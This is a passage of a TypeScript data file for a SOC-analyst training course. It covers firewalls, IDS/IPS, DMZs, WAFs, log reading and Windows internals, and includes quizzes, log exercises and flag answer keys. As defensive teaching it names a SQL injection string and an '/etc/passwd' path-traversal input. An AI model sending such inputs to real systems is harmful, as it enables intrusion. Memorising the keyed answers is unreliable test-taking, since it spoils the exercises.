          "A successful RDP brute-force attack — the attacker guessed the correct password after hundreds of attempts",
          "A network monitoring tool performing automated credential checks",
        ],
        answer: 2,
        explanation:
          "This is a textbook RDP brute-force attack. 847 failures in 2 minutes from a single external IP (45.33.32.156 is a Shodan/scanner IP, notably) indicates automated password guessing. The single auth_success after all those failures means the attack succeeded — the attacker now has valid credentials and remote desktop access to the server. This requires immediate incident response: isolate the server, reset credentials, and investigate what the attacker accessed.",
        xp: 20,
      },
      {
        type: "log_analysis" as const,
        id: "net-prot-la1",
        heading: "Suspicious DNS Query — DGA Malware Detection",
        context:
          "Your SIEM has flagged an unusual DNS query from a workstation. The company uses 10.0.0.53 as its internal DNS server. This query went to an external resolver (8.8.8.8 — Google's public DNS, which should be blocked by policy) and the domain requested looks like it was randomly generated. Analyze the event.",
        event: {
          id: "evt-dns-001",
          ts: "2025-11-15T03:22:17Z",
          source: "dns" as const,
          event_type: "dns_query" as const,
          severity: "high" as const,
          hostname: "CORP-WS-0112",
          src_ip: "10.2.8.112",
          dst_ip: "8.8.8.8",
          dst_port: 53,
          description:
            "Workstation queried external DNS server for high-entropy domain — potential DGA malware",
          dns: {
            query: "xk3r9qlpmf7wz2.com",
            response: "NXDOMAIN",
          },
          raw: {
            src_ip: "10.2.8.112",
            dst_ip: "8.8.8.8",
            dst_port: 53,
            protocol: "UDP",
            dns_query: "xk3r9qlpmf7wz2.com",
            dns_response: "NXDOMAIN",
            hostname: "CORP-WS-0112",
            username: "mwilson",
            query_count_last_hour: 312,
            unique_domains_queried: 289,
            timestamp: "2025-11-15T03:22:17Z",
            bypass_corporate_dns: true,
          },
        },
        questions: [
          {
            question:
              "Why is the domain 'xk3r9qlpmf7wz2.com' suspicious compared to a normal domain like 'microsoft.com'?",
            options: [
              "It uses the .com TLD which is reserved for commercial use only",
              "It is too short — domains must be at least 20 characters",
              "It appears randomly generated with high entropy (random-looking mix of letters and numbers with no recognizable words) — a hallmark of DGA (Domain Generation Algorithm) malware",
              "It contains numbers, which are not allowed in domain names",
            ],
            answer: 2,
            explanation:
              "Legitimate domains are human-readable ('google.com', 'microsoft.com', 'amazon.com'). DGA malware generates random-looking domains algorithmically — things like 'xk3r9qlpmf7wz2.com' or 'p9kz2mwrqx.net'. The malware tries hundreds of these domains until one of them is registered and active by the attacker. The raw log shows 289 unique domains queried in one hour — that's DGA behavior. The NXDOMAIN response (domain doesn't exist) is also expected — most generated domains won't be registered.",
            xp: 20,
          },
          {
            question:
              "The log shows dst_ip: 8.8.8.8 instead of 10.0.0.53 (the corporate DNS). What is the security significance of this?",
            options: [
              "8.8.8.8 is faster than 10.0.0.53 so the workstation is optimizing network performance",
              "The workstation is bypassing the corporate DNS server to use Google's public DNS — this avoids corporate DNS monitoring and filtering, allowing the malware to reach domains that would be blocked",
              "8.8.8.8 is the default DNS for all Windows workstations",
              "This indicates the corporate DNS server is down, so the workstation found a backup",
            ],
            answer: 1,
            explanation:
              "Corporate DNS servers often have security controls — they block known malicious domains, log all queries for monitoring, and alert on DGA patterns. By sending DNS queries directly to 8.8.8.8 (Google's public DNS), the malware bypasses these controls. This is why corporate policy should block outbound port 53 traffic to anything except the authorized internal DNS servers. The bypass_corporate_dns: true field in the log confirms this.",
            xp: 20,
          },
        ],
      },
      {
        type: "flag" as const,
        id: "net-prot-f1",
        prompt:
          "In the DNS log above, what DNS response code did the server return for the suspicious domain query 'xk3r9qlpmf7wz2.com'? Enter the exact response code.",
        answer: "NXDOMAIN",
        hint: "Look at the dns_response field in the raw log data. NXDOMAIN means 'Non-Existent Domain.'",
        xp: 25,
      },
      {
        type: "question" as const,
        id: "net-prot-q3",
        question:
          "The WannaCry ransomware infected 200,000 computers in 150 countries in 2017. Which protocol vulnerability did it exploit to spread automatically across networks?",
        options: [
          "HTTP on port 80 — it exploited web servers",
          "DNS on port 53 — it poisoned DNS caches to spread",
          "SMB on port 445 — it used the EternalBlue exploit (MS17-010) to spread across Windows machines",
          "RDP on port 3389 — it brute-forced remote desktop services",
        ],
        answer: 2,
        explanation:
          "WannaCry used EternalBlue (CVE-2017-0144, also known as MS17-010), a critical vulnerability in Windows SMBv1 on port 445. The exploit was originally developed by the NSA and later leaked by a hacking group called Shadow Brokers. EternalBlue allowed unauthenticated remote code execution — meaning the ransomware could spread machine-to-machine automatically without any user interaction. Microsoft had released a patch (MS17-010) two months earlier, but unpatched systems were devastated.",
        xp: 15,
      },
    ],
  },

  // ─────────────────────────────────────────────────────────────────────────────
  // ROOM 3: Firewall & Network Security
  // ─────────────────────────────────────────────────────────────────────────────
  {
    id: "firewall-network-security",
    title: "Firewall & Network Security",
    description:
      "Understand how firewalls, IDS/IPS, and network segmentation protect organizations — and how SOC analysts read and act on network security logs.",
    difficulty: "beginner" as const,
    category: "Network Security" as const,
    estimatedMinutes: 40,
    xp: 350,
    icon: "🛡️",
    prerequisites: ["networking-protocols"],
    tasks: [
      {
        type: "reading" as const,
        id: "fw-r1",
        heading: "Firewall Types: From Packet Filtering to NGFW",
        content: `**What Is a Firewall?**

Imagine a nightclub. Outside, there's a bouncer with a guest list. Your job is to decide who gets in and who doesn't. You check IDs, you check the list, and sometimes you check the dress code. That's exactly what a firewall does for a network.

A **firewall** is a system (hardware, software, or both) that monitors and controls network traffic based on a set of **rules**. Traffic that matches an "allow" rule gets through; traffic that matches a "deny" or "drop" rule is blocked. Traffic that doesn't match any rule hits a **default policy** — either deny-all (safer) or allow-all (dangerous).

Firewalls sit at the boundary between networks: between the internet and your corporate network, between network segments within your company, or even on individual computers (Windows Firewall is a host-based firewall).

**Evolution of Firewall Technology**

Firewalls have evolved significantly over decades. Understanding the generations helps you understand why modern enterprise networks use multiple types.

**Generation 1: Packet Filtering Firewalls**

The simplest type. Imagine the bouncer only looking at what's printed on a ticket without actually reading the ticket properly.

Packet filtering firewalls examine each packet in isolation based on:
- Source IP address
- Destination IP address
- Source port
- Destination port
- Protocol (TCP, UDP, ICMP)

Rules look like: "ALLOW TCP from any to 10.1.1.1 port 443" or "DENY all from 1.2.3.4".

**Critical limitation:** Stateless. The firewall doesn't know if a packet is part of an established connection or a new attack. An attacker can send a crafted packet that looks like part of a legitimate connection (with the right flags set) and it might pass through.

Another limitation: Cannot see *inside* the packet. If malware sends an attack payload over port 80, the firewall just sees "port 80 is allowed" and lets it through.

**Generation 2: Stateful Inspection Firewalls**

The bouncer now keeps a notebook. When you're allowed in, your name goes in the notebook. When you leave and try to get back in, the bouncer recognizes you.

A stateful firewall maintains a **connection state table** — a record of all active network connections. For each connection, it tracks:
- Source IP, destination IP
- Source port, destination port
- Protocol
- Connection state (SYN sent, established, closing, etc.)

When a new packet arrives, the firewall checks: does this match an existing, established connection? If yes, it's allowed. If it claims to be a response but no corresponding request exists in the table, it's dropped.

This prevents many attacks that trick packet filters. For example, you can't send a "response" packet without a corresponding "request" being tracked.

Stateful firewalls are the baseline for most enterprise networks. Even today, most corporate firewalls are at least stateful.

**Generation 3: Next-Generation Firewalls (NGFW)**

The bouncer now has a scanner, a background-check database, and can read the contents of every package being brought in.

**NGFW** (Next-Generation Firewall) adds capabilities beyond stateful inspection:

- **Deep Packet Inspection (DPI):** Examines the actual *content* of packets, not just headers. Can detect malware patterns, exploits, and policy violations inside encrypted or unencrypted traffic.
- **Application Awareness (Layer 7):** Can identify applications regardless of port. If someone uses Tor on port 443, an NGFW can identify it as Tor (not just as HTTPS) and block it. Rules can be: "BLOCK all BitTorrent regardless of port" or "ALLOW YouTube but BLOCK Netflix."
- **User Identity:** Integrates with Active Directory to apply rules based on user, not just IP. "Allow the Finance group to access the accounting server" — when the accounting server's IP changes, the rule still works.
- **Integrated IPS:** Threat signature detection built in — catches known exploits, malware patterns, and attack signatures.
- **SSL/TLS Inspection:** Decrypts HTTPS traffic for inspection, then re-encrypts it. Controversial (privacy implications) but necessary to catch malware using HTTPS for C2.
- **Threat Intelligence Feeds:** Automatically blocks connections to known malicious IPs and domains, updated in real-time.

Examples of NGFW vendors: Palo Alto Networks, Check Point, Fortinet FortiGate, Cisco Firepower, Sophos XG.

**Firewall Rules: The Logic of Allow and Deny**

Rules are evaluated **top to bottom** and the first matching rule wins. A typical rule has:
- **Action:** ALLOW or DENY/DROP (DENY sends a rejection message back; DROP silently discards)
- **Source:** IP address, subnet, or "any"
- **Destination:** IP address, subnet, or "any"
- **Protocol:** TCP, UDP, ICMP, or "any"
- **Port:** Specific port, range, or "any"
- **Direction:** Inbound (into the network) or Outbound (leaving the network)

**Example rule set:**
1. ALLOW TCP from 10.0.0.0/24 to 10.0.1.50 port 443 (internal users to HTTPS server)
2. ALLOW TCP from any to 10.0.1.50 port 443 (public to web server)
3. DENY TCP from any to 10.0.1.50 port 22 (block SSH to web server)
4. DENY all from any to any (default deny everything else)

The order matters. Rule 3 comes before Rule 4 explicitly denies SSH — without Rule 3, SSH would also be caught by Rule 4, but being explicit is better practice.`,
      },
      {
        type: "reading" as const,
        id: "fw-r2",
        heading: "IDS, IPS, DMZ, Network Segmentation, and WAF",
        content: `**IDS vs IPS: Detect or Prevent?**

Imagine two security guards watching a building's entrance. One guard has a notepad and writes down everything suspicious they see, then radios you to investigate. Another guard has the authority to physically stop and remove suspicious people.

- **IDS (Intrusion Detection System):** The note-taking guard. Monitors traffic, generates alerts, but takes no action to stop attacks. Passive.
- **IPS (Intrusion Prevention System):** The active guard. Monitors traffic AND automatically blocks/drops malicious traffic. Active.

Both work by comparing traffic against **signatures** (patterns matching known attacks) and **anomalies** (behavior that deviates from a baseline).

**IDS placement:** Usually connected to a **SPAN port** or **network TAP** — a copy of all traffic is sent to the IDS so it can analyze without being in the traffic path. If the IDS crashes, traffic is unaffected (but you lose visibility).

**IPS placement:** Inline between network segments — all traffic passes *through* the IPS. If the IPS crashes, traffic might stop (fail-closed) or bypass (fail-open). Having the IPS inline gives it the power to block in real-time.

**Modern approach:** NGFWs typically include integrated IPS functionality, so the distinction between "firewall" and "IPS" has blurred. Vendors like Palo Alto (Threat Prevention), Check Point (IPS blade), and Fortinet (FortiGuard IPS) bundle IPS into their NGFW platforms.

**Detection methods:**
- **Signature-based:** Compares traffic to a database of known attack patterns. Fast and accurate for known threats, but blind to new/zero-day attacks.
- **Anomaly-based:** Learns normal baseline behavior and alerts on deviations. Can detect novel attacks, but generates more false positives.
- **Behavioral analysis:** Looks at patterns over time — beaconing, port scanning, lateral movement patterns.

**DMZ: The Buffer Zone**

The **DMZ** (Demilitarized Zone) is a network architecture concept borrowed from military terminology. In military usage, a DMZ is a buffer zone between two opposing forces where neither side deploys combat forces.

In networking, a DMZ is a **separate network segment** that sits between the internet and the internal corporate network. Servers that need to be accessible from the internet (web servers, email servers, VPN gateways) live in the DMZ — exposed to the internet but isolated from the sensitive internal network.

**Why a DMZ?**

Consider a corporate web server. It needs to be reachable from the internet (customers access it), but your HR database and financial systems definitely should NOT be reachable from the internet. If the web server gets hacked:
- **Without DMZ:** Attacker is now on the same network as your HR database — one hop away from everything sensitive
- **With DMZ:** Attacker is in the DMZ. A second firewall stands between the DMZ and the internal network. The attacker must compromise a second system to reach internal resources.

A DMZ adds an additional barrier that attackers must overcome.

**Typical DMZ architecture:**
- External firewall: Controls traffic between internet ↔ DMZ
- DMZ network: Web servers, email gateways, VPN endpoints, reverse proxies
- Internal firewall: Controls traffic between DMZ ↔ Internal network
- Internal network: Databases, file servers, Active Directory, workstations

**Network Segmentation and VLANs**

If everyone in a building had keys to every room — including the server room, the HR office, and the executive suite — that would be a terrible security design. Network segmentation is the network equivalent of separate rooms with separate keys.

**Network segmentation** divides a flat network into isolated segments so that even if an attacker compromises one segment, they cannot automatically access everything else.

**VLAN** (Virtual Local Area Network) is the primary technical mechanism for segmentation. VLANs create logical network boundaries on the same physical switch infrastructure. A packet in VLAN 10 (Finance) cannot reach VLAN 20 (HR) unless a router/firewall explicitly allows it.

**Why segment?**
- **Contain breaches:** Ransomware spreading via SMB can only reach machines in the same VLAN unless firewall rules allow cross-segment traffic
- **Compliance:** PCI-DSS (payment card security standard) requires cardholder data to be in a separate network segment
- **Reduce attack surface:** Printers and IoT devices (HVAC, badge readers) in a separate VLAN can't reach your servers
- **Performance:** Broadcast traffic stays within a VLAN, not flooding the entire network

**Common segmentation model:**
- Management VLAN (network equipment management)
- Server VLAN (production servers)
- Workstation VLAN (employee computers)
- Guest VLAN (guest Wi-Fi — isolated from everything)
- IoT VLAN (cameras, printers, building systems)
- DMZ VLAN (internet-facing services)

**WAF: Web Application Firewall**

A regular network firewall operates at Layers 3-4 (IP/port). A **WAF** (Web Application Firewall) operates at Layer 7 (Application layer) specifically for HTTP/HTTPS traffic. It understands the *content* of web requests and can block application-layer attacks.

**Attacks a WAF protects against:**
- **SQL Injection (SQLi):** Malicious SQL code inserted into a web form input (e.g., \`' OR 1=1 --\`)
- **Cross-Site Scripting (XSS):** JavaScript injected into web pages to steal session cookies
- **Path traversal:** Requests like \`/../../../etc/passwd\` to access files outside the web root
- **Remote File Inclusion (RFI) / Local File Inclusion (LFI)**
- **Log4Shell (CVE-2021-44228):** The 2021 critical vulnerability in the Log4j logging library, exploitable through HTTP headers

**WAF vs Network Firewall:**
- Network firewall: "Is this traffic allowed based on IP and port?"
- WAF: "Is this HTTP request safe? Does it contain SQL injection? XSS? Suspicious patterns?"

WAFs sit in front of web applications — either inline (blocking mode) or out-of-band (detection mode). Cloud WAFs like AWS WAF, Cloudflare WAF, and Azure Application Gateway WAF are common in modern architectures.`,
      },
      {
        type: "reading" as const,
        id: "fw-r3",
        heading: "Reading Firewall Logs: What Every Field Means",
        content: `**The Anatomy of a Firewall Log**

Firewall logs are the bread-and-butter of SOC analysis. Every connection attempt through a firewall generates a log entry. Learning to read these logs quickly and accurately is an essential skill.

A typical firewall log entry contains these key fields:

**timestamp:** When the event occurred. Example: "2025-11-14T14:32:17Z" (ISO 8601 UTC format)

**src_ip (Source IP):** Where the traffic came from. If this is a private IP (10.x.x.x, 192.168.x.x, 172.16-31.x.x), the traffic is from inside your network. If it's a public IP, the traffic came from the internet.

**src_port (Source Port):** The port the traffic originated from. Usually an ephemeral high port (49000+) for outbound connections.

**dst_ip (Destination IP):** Where the traffic was trying to go.

**dst_port (Destination Port):** The port being targeted. This tells you what service is being accessed. Port 443 = HTTPS, port 22 = SSH, port 3389 = RDP, etc.

**protocol:** TCP, UDP, or ICMP.

**action:** What the firewall did:
- **ALLOW / PERMIT:** Traffic was allowed through
- **DENY:** Traffic was blocked and the sender received an error response
- **DROP:** Traffic was silently discarded (no response to sender — this makes port scanning harder)
- **RESET:** Connection was terminated with a TCP RST

**rule_name / rule_id:** Which firewall rule matched this traffic. Critical for understanding why a decision was made.

**bytes_sent / bytes_received:** Volume of data transferred. 0 bytes received means the connection was blocked or never completed. Large bytes_received could indicate data exfiltration.

**duration:** How long the connection lasted. A 5-second connection is very different from a 3-hour connection.

**Reading a Deny Log — What Happened?**

Let's walk through a real example:

  timestamp: 2025-11-14T09:15:43Z
  src_ip: 45.227.255.206
  src_port: 52341
  dst_ip: 10.0.1.50
  dst_port: 22
  protocol: TCP
  action: DROP
  rule_name: BLOCK-SSH-FROM-INTERNET
  bytes_sent: 60
  bytes_received: 0

Reading this: At 9:15 AM UTC, an external IP (45.227.255.206, definitely a public IP) attempted to connect to our web server (10.0.1.50) on port 22 (SSH). The firewall dropped the packet (silently rejected). The rule BLOCK-SSH-FROM-INTERNET matched. No data was received (blocked before connection established).

Analysis: Someone outside is trying to SSH into our web server. This is a common attack — attackers scan the internet for exposed SSH servers. The firewall is correctly blocking it. However, if you see hundreds of these from different IPs, it might be worth investigating and potentially geoblock or add to a blocklist.

**Reading an Allow Log — Is This Good or Bad?**

  timestamp: 2025-11-15T02:47:33Z
  src_ip: 10.5.12.47
  src_port: 51234
  dst_ip: 185.220.101.34
  dst_port: 4444
  protocol: TCP
  action: ALLOW
  rule_name: DEFAULT-ALLOW-OUTBOUND
  bytes_sent: 2048
  bytes_received: 8192
  duration: 347

The action is ALLOW — so this passed. But should it have? An internal workstation connecting to an external IP on port 4444 for 347 seconds is very suspicious. Port 4444 is a common reverse shell port. The rule that allowed it is "DEFAULT-ALLOW-OUTBOUND" — a generic catch-all rule, not a specific intentional allow.

This is exactly the kind of finding a SOC analyst should escalate: the firewall allowed it, but the behavior looks like malware. Allowed traffic is not the same as safe traffic.

**Proxy Servers: The Middleman**

A **proxy server** acts as an intermediary between clients and servers. Two types matter for security:

- **Forward proxy:** Sits between internal users and the internet. All web requests from the corporate network go through the proxy, which inspects, logs, and potentially blocks them. Enforces web filtering, prevents direct internet access.

- **Reverse proxy:** Sits between the internet and internal servers. External users connect to the reverse proxy, which forwards requests to the appropriate backend server. Hides internal server IPs, can perform load balancing, and enables SSL inspection of inbound traffic.

**SSL inspection:** Since HTTPS is encrypted, firewalls and proxies can't see inside by default. SSL inspection (also called TLS interception or HTTPS decryption) works by: 1) The proxy acts as a "man-in-the-middle" between the client and server; 2) It decrypts the traffic, inspects it, re-encrypts it, and forwards it. The client sees a certificate signed by the company's internal CA (Certificate Authority) rather than the real server certificate. This is controversial for privacy but necessary for detecting HTTPS-based threats.`,
      },
      {
        type: "question" as const,
        id: "fw-q1",
        question:
          "A web server in your company's DMZ was compromised by an attacker. Because of proper DMZ architecture, what does the attacker still need to do to reach the internal corporate database?",
        options: [
          "Nothing — the DMZ is part of the internal network, so they have full access",
          "They only need to change their IP address to an internal one",
          "They must bypass or compromise a second firewall (between the DMZ and internal network) because the DMZ is isolated from the internal network",
          "They need to wait for a user to log in before they can access internal systems",
        ],
        answer: 2,
        explanation:
          "The purpose of a DMZ is to add an additional layer of protection. Even if an attacker fully compromises a server in the DMZ, they face a second firewall between the DMZ and the internal corporate network. This firewall should have strict rules — only allowing specific, necessary traffic from the DMZ to internal systems (like a database server accepting connections only from the specific app server in the DMZ). The attacker must now find a vulnerability in this second firewall or find a pivot point to reach internal systems.",
        xp: 15,
      },
      {
        type: "question" as const,
        id: "fw-q2",
        question:
          "What is the key difference between a stateful and a stateless (packet filtering) firewall?",
        options: [
          "Stateful firewalls are faster because they don't have to store any information",
          "Stateless firewalls track active connections while stateful firewalls only check individual packets",
          "Stateful firewalls track the state of active connections and only allow packets that are part of established, legitimate sessions — stateless firewalls inspect each packet in isolation without connection context",
          "Stateless firewalls can inspect HTTPS traffic while stateful firewalls cannot",
        ],
        answer: 2,
        explanation:
          "A stateful firewall maintains a connection state table and tracks every active TCP/UDP session. It knows if an incoming packet belongs to an established connection or is a new, potentially malicious packet trying to bypass rules. A stateless (packet-filtering) firewall checks each packet independently — it doesn't know if it's a response to an internal request or a spoofed attack packet. This makes stateless firewalls vulnerable to attacks like IP spoofing and TCP RST injection.",
        xp: 15,
      },
      {
        type: "log_analysis" as const,
        id: "fw-la1",
        heading: "Port Scan Detection — Network Reconnaissance Alert",
        context:
          "Your IDS has flagged an alert on the perimeter network. An external IP address appears to be conducting a port scan against your company's internet-facing IP range. Port scans are a common first step in network reconnaissance — attackers map out what services are running before choosing an attack vector. Review the IDS alert below.",
        event: {
          id: "evt-ids-001",
          ts: "2025-11-18T22:03:44Z",
          source: "ids" as const,
          event_type: "ids_signature" as const,
          severity: "medium" as const,
          src_ip: "91.235.234.192",
          dst_ip: "203.0.113.10",
          description:
            "Nmap SYN scan detected — attacker mapping open ports on company perimeter",
          mitre_technique: "T1046 - Network Service Discovery",
          raw: {
            alert_signature: "ET SCAN Nmap Scripting Engine User-Agent Detected",
            signature_id: "2024364",
            src_ip: "91.235.234.192",
            dst_ip: "203.0.113.10",
            src_port: 45821,
            dst_ports_scanned: [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 3389, 8080],
            scan_type: "SYN_SCAN",
            packets_sent: 14,
            syn_packets_without_ack: 14,
            scan_duration_ms: 1240,
            tool_identified: "Nmap",
            geo_src_country: "LT",
            threat_intel: "IP flagged in 3 threat feeds",
            action: "alert",
            rule_category: "SCAN",
            timestamp: "2025-11-18T22:03:44Z",
          },
        },
        questions: [
          {
            question:
              "The log shows 'syn_packets_without_ack: 14'. In the context of TCP's three-way handshake, what does this indicate about the scan technique?",
            options: [
              "The attacker's computer had a network problem that caused lost packets",
              "This is a SYN scan (half-open scan) — the attacker sent SYN packets to probe ports but never completed the handshake. If a port is open, the server sends SYN-ACK; if closed, it sends RST. By never sending the final ACK, the attacker maps open ports without fully establishing connections (harder to detect)",
              "The firewall was successfully blocking all the connection attempts",
              "This is normal TCP behavior — ACK packets arrive separately from SYN packets",
            ],
            answer: 1,
            explanation:
              "A SYN scan (also called a 'stealth scan' or 'half-open scan') is Nmap's default scan technique. The attacker sends a SYN packet. If the port is open, the server responds with SYN-ACK (the second step of the handshake). The attacker notes 'port open' and sends RST to close the half-open connection without completing the handshake. If the port is closed, the server responds with RST. This technique doesn't appear in many application logs (because the TCP connection never fully formed), making it harder to detect than a full connect scan — which is why IDS signature detection is important.",
            xp: 20,
          },
          {
            question:
              "Looking at the dst_ports_scanned list, which port should be most concerning if found open and accessible from the internet?",
            options: [
              "Port 80 — HTTP web traffic should never be internet-accessible",
              "Port 53 — DNS should never be visible from the internet",
              "Port 3389 (RDP) — Remote Desktop Protocol exposed to the internet is a critical risk and a top initial access vector for ransomware attacks",
              "Port 443 — HTTPS is the most dangerous protocol for internet-facing servers",
            ],
            answer: 2,
            explanation:
              "Port 3389 (RDP) exposed to the internet is one of the highest-risk findings in network security. Multiple major threat intelligence reports identify internet-facing RDP as the #1 initial access vector for ransomware operators. Attackers brute-force RDP credentials or exploit RDP vulnerabilities (BlueKeep, DejaBlue) to gain initial access, then spread ransomware across the network. Port 80/443 are expected to be open on web servers. Port 53 may be open on DNS servers (but should be restricted to specific resolvers). RDP should never be directly accessible from the internet without a VPN.",
            xp: 20,
          },
        ],
      },
      {
        type: "flag" as const,
        id: "fw-f1",
        prompt:
          "In the port scan IDS alert above, what was the value of the 'action' field? This tells you what the IDS did when it detected the scan (hint: it's one word and tells you the IDS only detected but did not block).",
        answer: "alert",
        hint: "Look in the raw log data for the 'action' field. An IDS generates alerts but does not block — that's the difference between IDS and IPS.",
        xp: 25,
      },
      {
        type: "question" as const,
        id: "fw-q3",
        question:
          "Your company implements network VLANs: VLAN 10 (Workstations), VLAN 20 (Servers), VLAN 30 (Finance), and VLAN 40 (Guest Wi-Fi). Ransomware infects a workstation on VLAN 10 and tries to spread via SMB (port 445). With proper firewall rules between VLANs, what is the best expected outcome?",
        options: [
          "The ransomware immediately spreads to all VLANs because VLANs only separate network broadcast domains, not actual traffic",
          "The ransomware is contained to VLAN 10 (Workstations) because firewall rules block SMB from VLAN 10 to VLAN 20/30/40 — limiting the blast radius significantly",
          "The ransomware cannot spread at all because the infected workstation is on a VLAN",
          "VLANs automatically stop ransomware using built-in signature detection",
        ],
        answer: 1,
        explanation:
          "Proper network segmentation with firewall rules between VLANs is one of the most effective defenses against ransomware lateral movement. If SMB (port 445) is blocked between VLAN 10 and VLAN 20/30, the ransomware cannot spread to servers or finance systems — it's contained to the workstation VLAN. This 'blast radius limitation' is why security frameworks like NIST CSF, ISO 27001, and CIS Controls all emphasize network segmentation. Note: VLANs alone don't stop traffic — you need inter-VLAN firewall rules as well.",
        xp: 15,
      },
    ],
  },

  // ─────────────────────────────────────────────────────────────────────────────
  // ROOM 4: Windows Fundamentals for SOC Analysts
  // ─────────────────────────────────────────────────────────────────────────────
  {
    id: "windows-fundamentals",
    title: "Windows Fundamentals for SOC Analysts",
    description:
      "Master the Windows internals that matter most in security investigations — from registry run keys to suspicious PowerShell commands.",
    difficulty: "beginner" as const,
    category: "Endpoint Security" as const,
    estimatedMinutes: 45,
    xp: 350,
    icon: "🪟",
    prerequisites: ["networking-fundamentals"],
    tasks: [
      {
        type: "reading" as const,
        id: "win-fund-r1",
        heading: "Windows Architecture, File System, and User Accounts",
        content: `**Why Windows Knowledge Is Essential for SOC Analysts**

The vast majority of enterprise environments run Microsoft Windows. Nearly every security incident — ransomware, data breaches, insider threats, APT (Advanced Persistent Threat) intrusions — involves Windows systems at some point. To investigate, detect, and respond to threats, you must understand how Windows works from the inside.

This room focuses on the aspects of Windows that matter most for security analysis, not for system administration or software development.

**Windows Architecture: Kernel and User Space**

Windows is divided into two fundamental areas:

**Kernel Space (Ring 0):** The core of the operating system. Code running in kernel space has unlimited access to hardware, memory, and every other part of the system. The Windows kernel (ntoskrnl.exe) manages memory, processes, I/O operations, and hardware communication. Drivers (software that controls hardware like graphics cards and network adapters) also run here.

**Security implication:** Malware that reaches kernel level (called a **rootkit**) can hide processes, files, network connections, and registry entries from user-space security tools. Kernel-level rootkits are extremely difficult to detect and remove. This is why modern systems use **Secure Boot** and **Kernel Patch Protection (KPP / PatchGuard)** — to prevent unauthorized code from running in kernel space.

**User Space (Ring 3):** Where normal applications run — your browser, Office documents, and most malware. User-space applications can only access their own memory and must use system calls (APIs) to request services from the kernel. This is safer — if a user-space app crashes, it usually doesn't crash the whole system.

**Windows File System: Key Locations**

Understanding the Windows directory structure is essential for investigation. Here are the paths every SOC analyst must know:

**C:\\Windows\\System32\\**
The most important directory on a Windows system. Contains core OS files: the Windows kernel, system DLLs (Dynamic Link Libraries), built-in executables, and services. Critical files here include:
- cmd.exe — Command Prompt
- powershell.exe — PowerShell
- svchost.exe — Service Host (runs Windows services)
- lsass.exe — Local Security Authority Subsystem Service (manages authentication — primary target for credential dumping attacks like Mimikatz)
- explorer.exe — Windows Explorer (the graphical shell)
- wscript.exe / cscript.exe — Windows Script Host (runs .vbs and .js scripts)

**Security note:** Malware frequently disguises itself by using names similar to legitimate system files — "svch0st.exe" (zero instead of 'o'), "1sass.exe" (one instead of 'l'), or placing malicious copies of legitimate file names in other directories like %TEMP%.

**C:\\Windows\\SysWOW64\\**
Contains 32-bit versions of system files on 64-bit Windows. The naming is counterintuitive but important — SysWOW64 = 32-bit, System32 = 64-bit (for historical reasons). Malware targeting 32-bit compatibility often runs from here.

**C:\\Users\\[username]\\AppData\\**
Application data for each user, divided into:
- **Roaming:** Synced across domain computers (e.g., browser profiles)
- **Local:** Machine-specific app data
- **LocalLow:** Restricted app data (used by sandboxed browser processes)

**%APPDATA%** is a shorthand that expands to C:\\Users\\[username]\\AppData\\Roaming. This directory is **writable by the user without admin rights** — making it a favorite location for malware to drop files. If you see an executable launching from %APPDATA%, that's a significant red flag.

**%TEMP% (C:\\Users\\[username]\\AppData\\Local\\Temp\\)**
Temporary files. Also user-writable. Malware frequently drops payloads here. A process launching from %TEMP% is very suspicious.

**C:\\Program Files\\ and C:\\Program Files (x86)\\**
Where legitimate installed applications live. Requires administrator rights to write here.

**C:\\ProgramData\\**
Application data shared between all users. Also writable and commonly abused by malware.

**Windows User Accounts: Local, Domain, and Special Accounts**

**Local accounts:** Exist only on one computer. Created and managed locally. Example: a "backup-operator" account on a standalone server.

**Domain accounts:** Managed by **Active Directory (AD)** — a central directory service that manages all users, computers, and resources in a corporate environment. When you log into a corporate laptop, you're using a domain account. Domain accounts are authenticated by **Domain Controllers (DC)** — the most critical servers in any enterprise environment.

**Key built-in accounts:**
- **Administrator:** The built-in local admin account. Most enterprises disable this or rename it. If you see it being used, investigate — legitimate users should have named accounts.
- **Guest:** A limited account, usually disabled in corporate environments.
- **SYSTEM:** Not a real user account — it's the identity Windows uses for the operating system itself. Processes running as SYSTEM have more privileges than a local administrator. Malware that escalates to SYSTEM privilege has essentially complete control of the machine. Look for: processes running as SYSTEM that shouldn't be (like random executables in %TEMP%).
- **NT AUTHORITY\\NETWORK SERVICE / LOCAL SERVICE:** Limited service accounts with specific network permissions.

**UAC: User Account Control**

Before Windows Vista, most users ran as full administrators all the time — installing software, modifying system settings, even running malware could all happen without any prompt. This led to widespread malware infections.

**UAC (User Account Control)**, introduced in Vista and standard since Windows 7, requires explicit confirmation before applications can make changes requiring administrator rights. You've seen the UAC prompt: "Do you want to allow this app to make changes to your device?"

**How UAC works for security:**
Even if you're logged in as an administrator, your normal processes run with standard user privileges. When something needs admin rights, UAC prompts you to confirm (or requests credentials if you're a standard user).

**UAC Bypass attacks:** A significant portion of malware research focuses on bypassing UAC without triggering the prompt. Common techniques include DLL hijacking, using trusted Windows processes to spawn elevated processes, and various COM object (Component Object Model) abuses. When you see a process gaining elevated privileges without a UAC prompt in your logs, that's a UAC bypass — a serious finding.`,
      },
      {
        type: "reading" as const,
        id: "win-fund-r2",
        heading: "The Windows Registry: A SOC Analyst's Map to Persistence",
        content: `**What Is the Windows Registry?**

The Windows Registry is a hierarchical database that stores configuration settings and options for the operating system and for applications. Think of it as the brain of Windows — almost every setting, every application preference, every hardware configuration, and every startup program is recorded here.

Visually, the Registry looks like a file system — but instead of folders and files, it has **keys** (like folders) and **values** (like files with data inside them).

You can view the Registry by typing **regedit** in the Run dialog (Win+R) — but be careful. Incorrect edits can break Windows.

**Registry Root Hives**

The Registry is divided into five top-level "hives" (HKEY = Handle to a Registry Key):

**HKEY_LOCAL_MACHINE (HKLM)**
Settings that apply to the entire computer, regardless of who's logged in. Requires administrator rights to modify. Contains settings for installed software, system services, hardware drivers, and security policies. SOC analysts spend a lot of time here because malware often establishes persistence by creating values under HKLM.

**HKEY_CURRENT_USER (HKCU)**
Settings for the currently logged-in user. Only requires user-level rights to modify — which is exactly why malware uses it. A user-privilege malware can write persistence here without needing to elevate.

**HKEY_USERS (HKU)**
Contains HKCU data for all users that have logged in, stored by SID (Security Identifier — the unique ID for each user account).

**HKEY_CLASSES_ROOT (HKCR)**
File association and COM object registration. Attackers abuse COM hijacking — replacing legitimate COM registrations with malicious code.

**HKEY_CURRENT_CONFIG (HKCC)**
Current hardware configuration. Rarely modified by attackers.

**The #1 Persistence Location: Run Keys**

